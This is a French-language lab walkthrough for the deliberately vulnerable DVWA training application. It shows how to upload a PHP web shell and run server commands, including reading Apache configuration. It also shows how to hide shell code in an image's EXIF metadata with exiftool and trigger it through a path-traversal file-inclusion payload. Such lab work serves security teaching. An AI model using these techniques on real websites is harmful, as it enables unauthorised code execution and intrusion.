# Exploitation de la Faille File Inclusion avec DVWA

# Mode difficulté : bas (low)

## Objectif

Télécharger un code malveillant.

## Etat du code côté DVWA

- Aucun contrôle sur les upload.

## Mode opératoire

- Mettez DVWA en mode de difficulté "low"
- Téléchargez le fichier contenant la console php
- A l'aide de l'interface de téléchargement (menu **File Upload**), chargez le fichier `shell.php`. Le message suivant devrait apparaître : "../../hackable/uploads/shell.php succesfully uploaded!"
- Accédez à la page https://votreserveurdwa/DVWA/hackable/uploads/shell.php
- Testez les différentes lignes de commandes interprétables par le serveur :

```shell
pwd
whoami
ls /var/log
less /etc/apache2/apache2.conf
```


# Mode difficulté : élevée (high)

## Objectif

Inclure du code malveillant dans une image.

## Mode opératoire

- Récupérez l'utilitaire exiftool ici : https://exiftool.org/
- Récupérez le code de la console web (shell.php) dans /template/remote-exec/shell.php
- Récupérez une image de petite taille, par exemple : https://image.pi7.org/static/img/pi750kbjpeg.png
- A l'aide de Powershell, exécutez le code suivant :

```powershell
$document = Get-Content "cheminverslefichierShell.php"
exiftool.exe -DocumentName="$document" "chemin_vers_image.jpg"
```

- Téléchargez l'image à l'aide de la page de chargement de DVWA (/DVWA/vulnerabilities/upload)
- Testez l'exécution de l'image à l'aide de la faille "File Inclusion" : DVWA/vulnerabilities/fi/?page=file1.php%0A/../../../hackable/uploads/votreimage.jpg
